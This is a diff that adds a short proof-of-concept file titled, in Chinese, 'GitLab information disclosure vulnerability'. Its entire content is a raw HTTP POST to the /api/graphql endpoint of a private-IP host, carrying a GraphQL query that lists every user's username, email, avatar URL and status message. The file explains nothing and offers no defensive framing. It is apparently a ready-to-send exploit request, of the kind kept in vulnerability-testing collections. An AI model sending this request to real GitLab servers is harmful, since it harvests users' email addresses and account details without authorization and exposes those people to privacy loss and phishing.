@@ -1,0 +1,8 @@
+# GitLab 信息泄露漏洞
+POST /api/graphql HTTP/1.1
+Host: 10.50.32.47:8090
+Content-Length: 212
+Content-Type: application/json
+
+
+{"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }","variables":null,"operationName":null}
